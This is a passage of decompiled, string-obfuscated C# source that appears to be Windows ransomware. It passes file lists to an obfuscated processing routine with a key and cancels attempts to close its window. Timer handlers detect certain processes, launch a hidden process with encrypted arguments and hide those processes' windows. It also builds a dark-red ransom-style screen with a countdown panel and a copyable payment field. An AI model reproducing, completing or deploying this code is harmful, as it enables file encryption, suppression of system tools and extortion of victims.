㲂㶛㺛㿠䂊䇇䋬䎙䓲䗍䛣䟽䣩䧯䫄䯛䳼䷛仂侄傃凼勉叇哠喍囯埝増姯嫅寮岐巚廈徜惕懀拆揺擖斱曹柉棎槴櫤殨沰涵滄濃烎熺犺珙瓧疾盫矚磠禦竀篑粷緄绲翆胐脸舻茎萒蔺蘫蜁衏褹訐謿谶贱踀輁遏鄟鈙錴鐋镓陜霃頰餡驍魈鱑鴵鸢鼉ꀇꅬꉽꌹꐉꔣꙥꝠ꠶ꤔ꩷ꬡ걿괐긙꼰뀦녤눸댪됵딋똲뜊롥뤵먟묫백뵼븄뼬쀮셾쉬쌐쑺앻왠읫젓쥇쨀쭣챕쵳칂켜큉텧퉗팉푄픆홽흨\ud87c\ud96b\uda48\udb6d\udc53\udd7a\ude7c\udf53\ue042\ue120\ue25d\ue35a\ue431\ue55b\ue62f\ue740\ue82d\ue976\uea21\ueb27\uec75\ued65\uee44\uef55\uf033\uf169\uf239\uf37f\uf47f\uf536\uf67a\uf762\uf85f省褐ﭼﰶ\ufd42︶｟");
		for (int i = 0; i < files.Length; i++)
		{
			gClass.method_0(files[i], string_);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			gClass.method_0(files2[j], string_);
		}
		for (int k = 0; k < files4.Length; k++)
		{
			gClass.method_0(files4[k], string_);
		}
		for (int l = 0; l < files3.Length; l++)
		{
			gClass.method_0(files3[l], string_);
		}
	}

	private void timer_1_Tick(object sender, EventArgs e)
	{
		timer_1.Stop();
		smethod_0();
	}

	private void textBox_0_TextChanged(object sender, EventArgs e)
	{
	}

	private void GForm0_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void label_1_Click(object sender, EventArgs e)
	{
	}

	private void label_7_Click(object sender, EventArgs e)
	{
	}

	private void button_0_Click(object sender, EventArgs e)
	{
		Clipboard.SetText(((Control)textBox_1).get_Text());
	}

	private void timer_2_Tick(object sender, EventArgs e)
	{
		Process[] processesByName = Process.GetProcessesByName(GClass2.smethod_0("sŧɶ\u036fѮեٳ"));
		if (processesByName.Length == 1)
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = GClass2.smethod_0("dūɡ\u032aѦպ٤");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.Arguments = GClass2.smethod_0("ÛǛˑΜӸրۥ\u07edࣄ\u09d3\u0ac7\u0bc7೯\u0d97ໄ࿃\u10caᇜዝᏞᓄᗌᛀ\u17c4ᣂᦃ\u1af9ᯀ᳆\u1dd1Ị\u1fd4\u20f0⇮⊽⎳ⓨ►⚶⟾⢷⦹⫤⮴ⲵⶴ⺱⿴リ㇢㊭㏏㒱㗖㛜㟻㣢㧴㫶㯘㲦㷷㻲㿥䀍䄎䈏䌓䐝䔓䘕䜝䡒䤪䨱䬛䰐䴇东伕倁儚刞卌呄唙噉均堁奆婊嬕屃嵄幇彀总愻戱捼搘敠昅服栤椳樧欧氏海渤漣瀪焼爽猾琤甬瘠眤砢祣稙笀簬紵縯缬聐腟艙荏萛蔕虊蜘蠘襐訕講豂贒踗輖透鄎鉉鍉鑇锊陪霒须饳驖魁鱑鵑鹽鼅ꁪꅭꉸꍮꑫꕨ\ua676Ꝿ\ua87eꥺꩰꬱ걏굖깾꽳끺녣뉨덢둿땹똩뜧롴뤦먪뭢밣봭빰");
			Process.Start(processStartInfo);
		}
		Process[] processesByName2 = Process.GetProcessesByName(GClass2.smethod_0("zŦɿ\u0362Ѵն٬ݦ\u086e७"));
		if (processesByName2.Length == 1)
		{
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
			processStartInfo2.FileName = GClass2.smethod_0("dūɡ\u032aѦպ٤");
			processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo2.Arguments = GClass2.smethod_0("ÛǛˑΜӸրۥ\u07edࣄ\u09d3\u0ac7\u0bc7೯\u0d97ໄ࿃\u10caᇜዝᏞᓄᗌᛀ\u17c4ᣂᦃ\u1af9ᯀ᳆\u1dd1Ị\u1fd4\u20f0⇮⊽⎳ⓨ►⚶⟾⢷⦹⫤⮴ⲵⶴ⺱⿴リ㇢㊭㏏㒱㗖㛜㟻㣢㧴㫶㯘㲦㷷㻲㿥䀍䄎䈏䌓䐝䔓䘕䜝䡒䤪䨱䬛䰐䴇东伕倁儚刞卌呄唙噉均堁奆婊嬕屃嵄幇彀总愻戱捼搘敠昅服栤椳樧欧氏海渤漣瀪焼爽猾琤甬瘠眤砢祣稙笀簬紵縯缬聐腟艙荏萛蔕虊蜘蠘襐訕講豂贒踗輖透鄎鉉鍉鑇锊陪霒须饳驖魁鱑鵑鹽鼅ꁪꅭꉸꍮꑫꕨ\ua676Ꝿ\ua87eꥺꩰꬱ걏굖깾꽳끺녣뉨덢둿땹똩뜧롴뤦먪뭢밣봭빰");
			Process.Start(processStartInfo2);
		}
		Process[] processesByName3 = Process.GetProcessesByName(GClass2.smethod_0("}žɤ\u0369Ѭջٴݮࡤ१੨୧\u0c73"));
		if (processesByName3.Length == 1)
		{
			ProcessStartInfo processStartInfo3 = new ProcessStartInfo();
			processStartInfo3.FileName = GClass2.smethod_0("dūɡ\u032aѦպ٤");
			processStartInfo3.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo3.Arguments = GClass2.smethod_0("ÛǛˑΜӸրۥ\u07edࣄ\u09d3\u0ac7\u0bc7೯\u0d97ໄ࿃\u10caᇜዝᏞᓄᗌᛀ\u17c4ᣂᦃ\u1af9ᯀ᳆\u1dd1Ị\u1fd4\u20f0⇮⊽⎳ⓨ►⚶⟾⢷⦹⫤⮴ⲵⶴ⺱⿴リ㇢㊭㏏㒱㗖㛜㟻㣢㧴㫶㯘㲦㷷㻲㿥䀍䄎䈏䌓䐝䔓䘕䜝䡒䤪䨱䬛䰐䴇东伕倁儚刞卌呄唙噉均堁奆婊嬕屃嵄幇彀总愻戱捼搘敠昅服栤椳樧欧氏海渤漣瀪焼爽猾琤甬瘠眤砢祣稙笀簬紵縯缬聐腟艙荏萛蔕虊蜘蠘襐訕講豂贒踗輖透鄎鉉鍉鑇锊陪霒须饳驖魁鱑鵑鹽鼅ꁪꅭꉸꍮꑫꕨ\ua676Ꝿ\ua87eꥺꩰꬱ걏굖깾꽳끺녣뉨덢둿땹똩뜧롴뤦먪뭢밣봭빰");
			Process.Start(processStartInfo3);
		}
		timer_2.Start();
	}

	private void timer_3_Tick(object sender, EventArgs e)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = GClass2.smethod_0("dūɡ\u032aѦպ٤");
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = GClass2.smethod_0("ÛǛˑΜӸրۥ\u07edࣄ\u09d3\u0ac7\u0bc7೯\u0d97ໄ࿃\u10caᇜዝᏞᓄᗌᛀ\u17c4ᣂᦃ\u1af9ᯀ᳆\u1dd1Ị\u1fd4\u20f0⇮⊽⎳ⓨ►⚶⟾⢷⦹⫤⮴ⲵⶴ⺱⿴リ㇢㊭㏏㒱㗖㛜㟻㣢㧴㫶㯘㲦㷷㻲㿥䀍䄎䈏䌓䐝䔓䘕䜝䡒䤪䨱䬛䰐䴇东伕倁儚刞卌呄唙噉均堁奆婊嬕屃嵄幇彀总愻戱捼搘敠昅服栤椳樧欧氏海渤漣瀪焼爽猾琤甬瘠眤砢祣稙笀簬紵縯缬聐腟艙荏萛蔕虊蜘蠘襐訕講豂贒踗輖透鄎鉉鍉鑇锊陪霒须饳驖魁鱑鵑鹽鼅ꁪꅭꉸꍮꑫꕨ\ua676Ꝿ\ua87eꥺꩰꬱ걏굖깾꽳끺녣뉨덢둿땹똩뜧롴뤦먪뭢밣봭빰");
		Process.Start(processStartInfo);
	}

	private void timer_4_Tick(object sender, EventArgs e)
	{
		timer_4.Stop();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == GClass2.smethod_0("`ůɥ"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("uţɢ\u0361ѧիٵ"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("]žɤ\u0369Ѭջٴݮࡤ१੨୧\u0c73"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("vŠɠ\u036eѵ"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("zŦɿ\u0362Ѵն٬ݦ\u086e७"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			timer_4.Start();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void method_0()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Expected O, but got Unknown
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Expected O, but got Unknown
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0136: Unknown result type (might be due to invalid IL or missing references)
		//IL_0140: Expected O, but got Unknown
		//IL_0147: Unknown result type (might be due to invalid IL or missing references)
		//IL_0151: Expected O, but got Unknown
		//IL_0158: Unknown result type (might be due to invalid IL or missing references)
		//IL_0162: Expected O, but got Unknown
		//IL_0222: Unknown result type (might be due to invalid IL or missing references)
		//IL_022c: Expected O, but got Unknown
		//IL_02d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e1: Expected O, but got Unknown
		//IL_0459: Unknown result type (might be due to invalid IL or missing references)
		//IL_0463: Expected O, but got Unknown
		//IL_04ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_04f7: Expected O, but got Unknown
		//IL_0616: Unknown result type (might be due to invalid IL or missing references)
		//IL_0620: Expected O, but got Unknown
		//IL_06b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_06c3: Expected O, but got Unknown
		//IL_0759: Unknown result type (might be due to invalid IL or missing references)
		//IL_0763: Expected O, but got Unknown
		//IL_080b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0815: Expected O, but got Unknown
		//IL_08c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_08ce: Expected O, but got Unknown
		//IL_0995: Unknown result type (might be due to invalid IL or missing references)
		//IL_099f: Expected O, but got Unknown
		//IL_0a40: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a4a: Expected O, but got Unknown
		//IL_0c3b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c45: Expected O, but got Unknown
		//IL_0ce0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cea: Expected O, but got Unknown
		//IL_0d79: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d83: Expected O, but got Unknown
		//IL_0e33: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e3d: Expected O, but got Unknown
		//IL_0ef3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0efd: Expected O, but got Unknown
		//IL_0f94: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f9e: Expected O, but got Unknown
		//IL_104b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1055: Expected O, but got Unknown
		//IL_129f: Unknown result type (might be due to invalid IL or missing references)
		//IL_12a9: Expected O, but got Unknown
		//IL_12f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_12fe: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(GForm0));
		timer_0 = new Timer(icontainer_0);
		timer_1 = new Timer(icontainer_0);
		label_0 = new Label();
		label_1 = new Label();
		textBox_0 = new TextBox();
		label_2 = new Label();
		pictureBox_0 = new PictureBox();
		panel_0 = new Panel();
		label_3 = new Label();
		label_4 = new Label();
		label_5 = new Label();
		label_6 = new Label();
		label_7 = new Label();
		label_8 = new Label();
		textBox_1 = new TextBox();
		button_0 = new Button();
		panel_1 = new Panel();
		label_9 = new Label();
		pictureBox_1 = new PictureBox();
		label_10 = new Label();
		label_11 = new Label();
		label_12 = new Label();
		label_13 = new Label();
		label_14 = new Label();
		timer_2 = new Timer(icontainer_0);
		timer_3 = new Timer(icontainer_0);
		timer_4 = new Timer(icontainer_0);
		((ISupportInitialize)pictureBox_0).BeginInit();
		((Control)panel_0).SuspendLayout();
		((Control)panel_1).SuspendLayout();
		((ISupportInitialize)pictureBox_1).BeginInit();
		((Control)this).SuspendLayout();
		timer_0.set_Enabled(true);
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		timer_1.set_Enabled(true);
		timer_1.set_Interval(3000);
		timer_1.add_Tick((EventHandler)timer_1_Tick);
		((Control)label_0).set_AutoSize(true);
		((Control)label_0).set_BackColor(Color.DarkRed);
		((Control)label_0).set_Font(new Font(GClass2.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label_0).set_ForeColor(Color.White);
		((Control)label_0).set_Location(new Point(398, 3));
		((Control)label_0).set_Name(GClass2.smethod_0("jŤɦ\u0366Ѯ\u0530"));
		((Control)label_0).set_Size(new Size(431, 24));
		((Control)label_0).set_TabIndex(0);
		((Control)label_0).set_Text(GClass2.smethod_0("ałɃ\u035bљԈ؈ݦࡊ\u0949\u0a04\u0b5a\u0c4dൔ๒\u0f3fၷᅰቬ፴ᑨᕭᙹ\u1779ᡢ\u1935\u1a72᭺᱾ᵴṣἯ\u206fⅿ≩⌫⑯╧♫❵⡿⥵⩰⭦ⱦⴠ"));
		((Control)label_1).set_AutoSize(true);
		((Control)label_1).set_BackColor(Color.White);
		((Control)label_1).set_Font(new Font(GClass2.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label_1).set_ForeColor(Color.Black);
		((Control)label_1).set_Location(new Point(229, 71));
		((Control)label_1).set_Name(GClass2.smethod_0("jŤɦ\u0366ѮԳ"));
		((Control)label_1).set_Size(new Size(718, 16));
		((Control)label_1).set_TabIndex(1);
		((Control)label_1).set_Text(GClass2.smethod_0(">ēȟ\u0309яԁ؋\u074cࠒअਜଚ\u0c47\u0d02ช༇ဖᄏሄጎᐫᔭᙱ\u177cᠫ\u1932ᨶᬬ\u1c38ᴥṹὴ‷ℳ∥⌱\u242d┯☾✩⠸⥪⨨⬦Ⱓⵦ⸪⼰\u302bㄧ㈳㍠㑙㕗㙑㝙㡈㤚㩘㭊㱒㴖㹛㽛䁇䄒䉝䍟䑁䕉䙈䝞䠋䥋䩊䭋䱂䵕乌但偏兇刁卂呺啽噼坩塨奿娹孬屿嵳幬弴恻慳执捵搯敬晨杩桥椪橬武汤浴湼潴灷照牥"));
		((Control)label_1).add_Click((EventHandler)label_1_Click);
		((Control)textBox_0).set_BackColor(Color.White);
		((TextBoxBase)textBox_0).set_BorderStyle((BorderStyle)0);
		((TextBoxBase)textBox_0).set_HideSelection(false);
		((Control)textBox_0).set_Location(new Point(226, 27));
		((TextBoxBase)textBox_0).set_Multiline(true);
		((Control)textBox_0).set_Name(GClass2.smethod_0("|Ţɾͱцլٺ\u0730"));
		((TextBoxBase)textBox_0).set_ReadOnly(true);
		((Control)textBox_0).set_Size(new Size(774, 538));
		((Control)textBox_0).set_TabIndex(2);
		((TextBoxBase)textBox_0).set_WordWrap(false);
		((Control)textBox_0).add_TextChanged((EventHandler)textBox_0_TextChanged);
		((Control)label_2).set_AutoSize(true);
		((Control)label_2).set_BackColor(Color.White);
		((Control)label_2).set_Font(new Font(GClass2.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label_2).set_ForeColor(Color.Black);
		((Control)label_2).set_Location(new Point(229, 107));
		((Control)label_2).set_Name(GClass2.smethod_0("jŤɦ\u0366ѮԵ"));
		((Control)label_2).set_Size(new Size(739, 32));
		((Control)label_2).set_TabIndex(4);
		((Control)label_2).set_Text(GClass2.smethod_0("Øǵ\u02eaϰӴ\u05b0۶ߡ\u08f8ব૪௸೬ඨ\u0ee5\u0ff3ჶᇽኣᏮᓮᗯᘔ\u1717᠓ᤛ\u1a5bᬜᰖᴊṗ\u1f17⁕℃−⌋\u2451┄☀❎⠟⤉⨈⬅Ⱏⴍ⸕⽆〜ㄋ㈖㌐㑁㔆㘶㜲㠸㤯㩷㭺㰻㴭㸣㽶䀱䄻䉳䌼䐾䔤䙯䜹䠬䤿䨿䬯䱩䴱丨伳倷兤刷匫听唥嘑圞塳奓婙孕屝嵁帗录恔慚戓捀摔敓晀杘案楞樋歓汆浝湕漆灃煍牏獇瑒甀癨睷硩祴穴筯籭紕縝罹聠腦舳荶葴蕳虽蝷衽襸詢譥豧质蹴轣遷酲鉪鍡鑤"));
		pictureBox_0.set_Image((Image)componentResourceManager.GetObject(GClass2.smethod_0("aŹɬͺѸվٮ\u0748ࡦ॰ਸ਼ନ\u0c4c൩\u0e62ཥ\u1064")));
		((Control)pictureBox_0).set_Location(new Point(-10, 3));
		((Control)pictureBox_0).set_Name(GClass2.smethod_0("{ţɪͼѲմ٠\u0746\u086cॺਰ"));
		((Control)pictureBox_0).set_Size(new Size(233, 250));
		pictureBox_0.set_TabIndex(6);
		pictureBox_0.set_TabStop(false);
		panel_0.set_BorderStyle((BorderStyle)2);
		((Control)panel_0).get_Controls().Add((Control)(object)label_3);
		((Control)panel_0).get_Controls().Add((Control)(object)label_4);
		((Control)panel_0).get_Controls().Add((Control)(object)label_5);
		((Control)panel_0).set_Location(new Point(12, 259));
		((Control)panel_0).set_Name(GClass2.smethod_0("vŤɪ\u0366ѮԳ"));
		((Control)panel_0).set_Size(new Size(208, 124));
		((Control)panel_0).set_TabIndex(7);
		((Control)label_3).set_AutoSize(true);
		((Control)label_3).set_Font(new Font(GClass2.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 12f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label_3).set_ForeColor(Color.Yellow);
		((Control)label_3).set_Location(new Point(32, 10));
		((Control)label_3).set_Name(GClass2.smethod_0("jŤɦ\u0366ѮԶ"));
		((Control)label_3).set_Size(new Size(150, 20));
		((Control)label_3).set_TabIndex(7);
		((Control)label_3).set_Text(GClass2.smethod_0("NŹɠ\u0366гմٸݼࡪॽਭ\u0b7b\u0c62൦\u0e65༨ၥᅣሥ፨ᑬᕱᙵ"));
		((Control)label_4).set_AutoSize(true);
		((Control)label_4).set_Font(new Font(GClass2.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 12f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label_4).set_ForeColor(Color.White);
		((Control)label_4).set_Location(new Point(61, 51));
		((Control)label_4).set_Name(GClass2.smethod_0("jŤɦ\u0366ѮԹ"));
		((Control)label_4).set_Size(new Size(73, 20));
		((Control)label_4).set_TabIndex(6);
		((Control)label_4).set_Text(GClass2.smethod_0("^Šɥ\u0362Цթ١ݥ\u0876\u093b"));
		((Control)label_5).set_AutoSize(true);
		((Control)label_5).set_Font(new Font(GClass2.smethod_0("HťɼͺѮգٷܤࡍ१੶"), 27.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label_5).set_ForeColor(Color.White);
		((Control)label_5).set_Location(new Point(6, 71));
		((Control)label_5).set_Name(GClass2.smethod_0("jŤɦ\u0366ѮԸ"));
		((Control)label_5).set_Size(new Size(193, 39));
		((Control)label_5).set_TabIndex(3);
		((Control)label_5).set_Text(GClass2.smethod_0("8ķȼ\u0335дԹز\u0731"));
		((Control)label_6).set_AutoSize(true);
		((Control)label_6).set_BackColor(Color.White);
		((Control)label_6).set_Font(new Font(GClass2.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label_6).set_ForeColor(Color.Black);
		((Control)label_6).set_Location(new Point(229, 151));
		((Control)label_6).set_Name(GClass2.smethod_0("kŧɧ\u0361ѯԳر"));
		((Control)label_6).set_Size(new Size(222, 24));
		((Control)label_6).set_TabIndex(8);
		((Control)label_6).set_Text(GClass2.smethod_0("Tŷɻ\u0334ѺԲ٣ݵ\u086cॡ\u0a7b୩౹പ\u0e64\u0f71ဧᅠቬ፨ᑦᕱᘾ"));
		((Control)label_7).set_AutoSize(true);
		((Control)label_7).set_BackColor(Color.White);
		((Control)label_7).set_Font(new Font(GClass2.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label_7).set_ForeColor(Color.Black);
		((Control)label_7).set_Location(new Point(229, 189));
		((Control)label_7).set_Name(GClass2.smethod_0("kŧɧ\u0361ѯԳذ"));
		((Control)label_7).set_Size(new Size(234, 16));
		((Control)label_7).set_TabIndex(9);
		((Control)label_7).set_Text(GClass2.smethod_0("tœɗ\u0341ЃՀ\u0654ݔ\u083f१ੲ୩\u0c3b൲\u0e78\u0f6e\u1072ᄶቡ፻ᐳᕢᙰᝩᠯ\u192aᨾ\u1b3c\u1c2bᵣṧἨ\u2065Ⅿ≱⍧⑬╫♯"));
		((Control)label_7).add_Click((EventHandler)label_7_Click);
		((Control)label_8).set_AutoSize(true);
		((Control)label_8).set_BackColor(Color.White);
		((Control)label_8).set_Font(new Font(GClass2.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label_8).set_ForeColor(Color.Black);
		((Control)label_8).set_Location(new Point(228, 27));
		((Control)label_8).set_Name(GClass2.smethod_0("kŧɧ\u0361ѯԳس"));
		((Control)label_8).set_Size(new Size(307, 24));
		((Control)label_8).set_TabIndex(10);
		((Control)label_8).set_Text(GClass2.smethod_0("Kųɻ\u036dиտٷݥࡤॶ\u0a7c୵రൻ\u0e61༭ၡᅲሪ፪ᑧᕪᙶᝰᡰᥦ\u1a70\u1b3e"));
		((Control)textBox_1).set_BackColor(Color.DarkRed);
		((Control)textBox_1).set_Font(new Font(GClass2.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)textBox_1).set_ForeColor(Color.White);
		((Control)textBox_1).set_Location(new Point(235, 33));
		((TextBoxBase)textBox_1).set_Multiline(true);
		((Control)textBox_1).set_Name(GClass2.smethod_0("|Ţɾͱцլٺ\u0733"));
		((TextBoxBase)textBox_1).set_ReadOnly(true);
		((Control)textBox_1).set_Size(new Size(410, 30));
		((Control)textBox_1).set_TabIndex(11);
		((Control)textBox_1).set_Text(GClass2.smethod_0("\u0013ēɔ\u0326чՙ\u064cݼ\u086d६\u0a7d\u0b4dయ൛\u0e6dཞၵᅦሥጾᐷᕽᘻᝊᡋ\u1931\u1a61᭴ᱬᵷḲὐ⁏ⅶ"));
		((Control)button_0).set_Location(new Point(651, 33));
		((Control)button_0).set_Name(GClass2.smethod_0("eųɱͰѬլذ"));
		((Control)button_0).set_Size(new Size(40, 30));
		((Control)button_0).set_TabIndex(12);
		((Control)button_0).set_Text(GClass2.smethod_0("gŬɲ\u0378"));
		((ButtonBase)button_0).set_UseVisualStyleBackColor(true);
		((Control)button_0).add_Click((EventHandler)button_0_Click);
		panel_1.set_BorderStyle((BorderStyle)2);
		((Control)panel_1).get_Controls().Add((Control)(object)label_9);
		((Control)panel_1).get_Controls().Add((Control)(object)pictureBox_1);
		((Control)panel_1).get_Controls().Add((Control)(object)button_0);
		((Control)panel_1).get_Controls().Add((Control)(object)textBox_1);
		((Control)panel_1).set_Location(new Point(295, 571));
		((Control)panel_1).set_Name(GClass2.smethod_0("vŤɪ\u0366ѮԲ"));
		((Control)panel_1).set_Size(new Size(698, 70));
		((Control)panel_1).set_TabIndex(13);
		((Control)label_9).set_AutoSize(true);
		((Control)label_9).set_Font(new Font(GClass2.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label_9).set_ForeColor(Color.Yellow);
		((Control)label_9).set_Location(new Point(314, 10));
		((Control)label_9).set_Name(GClass2.smethod_0("kŧɧ\u0361ѯԳز"));
		((Control)label_9).set_Size(new Size(282, 20));
		((Control)label_9).set_TabIndex(15);
		((Control)label_9).set_Text(GClass2.smethod_0("pŇɏ\u0344пԺخܬ࠻ॳ\u0a77ସ\u0c75ൿ\u0e61\u0f77ၼᅻቿጰᑻᕡᘭ\u1778ᡣᥣ\u1a7aᬨᱦᵢṷὡ⁰ⅱ∻"));
		((Control)pictureBox_1).set_BackColor(SystemColors.ControlDarkDark);
		pictureBox_1.set_Image((Image)componentResourceManager.GetObject(GClass2.smethod_0("aŹɬͺѸվٮ\u0748ࡦ॰ਵନ\u0c4c൩\u0e62ཥ\u1064")));
		((Control)pictureBox_1).set_Location(new Point(3, 3));
		((Control)pictureBox_1).set_Name(GClass2.smethod_0("{ţɪͼѲմ٠\u0746\u086cॺਲ਼"));
		((Control)pictureBox_1).set_Size(new Size(211, 60));
		pictureBox_1.set_TabIndex(14);
		pictureBox_1.set_TabStop(false);
		((Control)label_10).set_AutoSize(true);
		((Control)label_10).set_BackColor(Color.White);
		((Control)label_10).set_Font(new Font(GClass2.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label_10).set_ForeColor(Color.Black);
		((Control)label_10).set_Location(new Point(229, 229));
		((Control)label_10).set_Name(GClass2.smethod_0("kŧɧ\u0361ѯԳص"));
		((Control)label_10).set_Size(new Size(215, 24));
		((Control)label_10).set_TabIndex(14);
		((Control)label_10).set_Text(GClass2.smethod_0("@žɴ\u0360гջٷ\u0730ࡦम੬ୠ౹൯\u0e68ཬၾᄦት፥ᑪᕦᘾ"));
		((Control)label_11).set_AutoSize(true);
		((Control)label_11).set_BackColor(Color.White);
		((Control)label_11).set_Font(new Font(GClass2.smethod_0("Yźɱ\u0363ѿռ١ݫ\u0878फਖ਼୨౦൴ฦབၡᅱቫ፧"), 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label_11).set_ForeColor(Color.Black);
		((Control)label_11).set_Location(new Point(230, 259));
		((Control)label_11).set_Name(GClass2.smethod_0("kŧɧ\u0361ѯԳش"));
		((Control)label_11).set_Size(new Size(405, 96));
		((Control)label_11).set_TabIndex(15);
		((Control)label_11).set_Text(componentResourceManager.GetString(GClass2.smethod_0("`Ūɨ\u036cѤԶسܫࡐ०\u0a7a୵")));
		((Control)label_12).set_AutoSize(true);
		((Control)label_12).set_BackColor(Color.White);
